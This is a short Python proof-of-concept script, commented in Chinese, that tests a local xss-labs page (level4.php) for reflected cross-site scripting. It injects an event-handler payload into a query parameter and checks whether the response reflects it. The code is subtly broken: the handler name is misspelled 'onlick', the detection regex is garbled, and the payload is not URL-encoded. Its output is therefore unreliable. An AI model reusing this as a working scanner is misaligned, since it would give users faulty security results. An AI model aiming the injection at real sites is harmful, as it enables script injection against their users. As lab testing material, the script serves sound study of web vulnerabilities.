import requests


def test_xss_poc(target_url, param_name, payload):

    # 构造恶意URL
    malicious_url = f"{target_url}?{param_name}={payload}"

    try:
        # 发送请求
        headers = {
            "User-Agent": "XSS-POC-Scanner/1.0",
            "Accept": "text/html"
        }
        response = requests.get(malicious_url, headers=headers, timeout=8)

        # 检测响应中是否包含原始payload（基础检测）
        if payload in response.text:
            return True

        # 响应内容分析（正则表达式检测）
        import re
        if re.search(r"onlick=.+?alert $.+?$ ", response.text):
            return True

    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")

    return False


if __name__ == "__main__":
    # 配置检测参数（实际使用需替换）
    TARGET = "http://localhost/xss-labs-master/level4.php"  # 替换为目标URL
    PARAM = "keyword"  # 替换为实际参数名

    # 无害化payload（安全测试规范）
    PAYLOAD = "onlick=alert('XSS_POC_安全测试')"  # 使用onlick事件处理器

    # 执行检测
    if test_xss_poc(TARGET, PARAM, PAYLOAD):
        print(f"[+] 存在反射型XSS漏洞: {TARGET}?{PARAM}=[payload]")
    else:
        print("[-] 未检测到反射型XSS漏洞")
